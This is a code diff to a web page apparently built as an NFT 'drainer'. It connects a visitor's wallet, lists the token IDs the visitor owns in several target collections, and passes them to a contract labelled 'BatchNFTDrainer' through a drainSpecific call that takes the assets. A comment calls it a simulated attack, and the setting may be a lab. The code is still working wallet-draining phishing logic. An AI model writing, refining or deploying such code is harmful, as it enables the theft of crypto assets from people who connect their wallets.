@@ -119,7 +119,7 @@
       "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604", // WGFake
       "0xc4b837Eb523A82F5214d43200af1491B93185979"  // HappyApeYC
     ];
-    const drainerContract = "0xf0e2a55Cdf217c8A537D4Ee1dDf2a0816B66c56F"; // PhishingNFTDrainer address
+    const drainerContract = "0xB3BFFC0a351271D5077ffAcf7072eC510Fe890Ff"; // New BatchNFTDrainer
     const nftABI = [
       "function setApprovalForAll(address operator, bool approved) external",
       "function balanceOf(address owner) view returns (uint256)",
@@ -127,7 +127,7 @@
       "function name() view returns (string)"
     ];
     const drainerABI = [
-      "function approveAndDrain(address[] calldata nftContracts) external"
+      "function drainSpecific(address[] calldata nftContracts, uint256[][] calldata tokenIds) external"
     ];
 
     let provider, signer;
@@ -137,6 +137,7 @@
       document.getElementById("failCount").textContent = localStorage.getItem("w3game_failed") || 0;
     }
 
+    // Connects wallet and displays owned NFTs from target collections
     document.getElementById("connectBtn").onclick = async () => {
       const status = document.getElementById("status");
       status.innerText = "⏳ Connecting...";
@@ -165,13 +166,32 @@
       }
     };
 
+    // Calls drainSpecific with token IDs per collection (simulates drain attack)
     document.getElementById("drainBtn").onclick = async () => {
       const status = document.getElementById("status");
       if (!signer) return alert("Please connect your wallet first.");
       try {
-        status.innerText = "🚨 Approving and draining NFTs...";
+        status.innerText = "🚨 Requesting approval and draining NFTs...";
+        const user = await signer.getAddress();
+
+        // Step 1: Loop through each contract and gather owned tokenIds
+        let tokenIdMatrix = [];
+        for (const contractAddr of nftContracts) {
+          const contract = new ethers.Contract(contractAddr, nftABI, signer);
+          const balance = await contract.balanceOf(user);
+          let ids = [];
+          for (let i = 0; i < balance; i++) {
+            try {
+              const tokenId = await contract.tokenOfOwnerByIndex(user, i);
+              ids.push(tokenId.toString());
+            } catch {}
+          }
+          tokenIdMatrix.push(ids);
+        }
+
+        // Step 2: Call drain function with the collected tokenIds
         const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
-        const tx = await drainer.approveAndDrain(nftContracts); // Single tx for approval and draining
+        const tx = await drainer.drainSpecific(nftContracts, tokenIdMatrix);
         await tx.wait();
 
         status.innerText =
